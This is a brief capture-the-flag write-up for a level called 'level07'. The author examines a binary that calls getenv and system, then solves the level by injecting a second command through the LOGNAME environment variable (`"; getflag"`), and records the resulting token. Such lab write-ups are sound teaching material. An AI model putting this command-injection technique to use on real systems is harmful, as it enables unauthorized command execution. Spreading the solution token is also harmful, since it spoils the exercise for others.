Notes:
nm
nm -u
gdb

functions found: 'getenv', 'system' 
binary prints out username: "level07"
so we figured that LOGNAME env var was fetched somehow by envp or getenv

tried few things to inject code
ended up with something simpler than our first attempts and it works!!

flag:
    `export LOGNAME="; getflag"`

token:
    `fiumuikeil55xe9cu4dood66h`
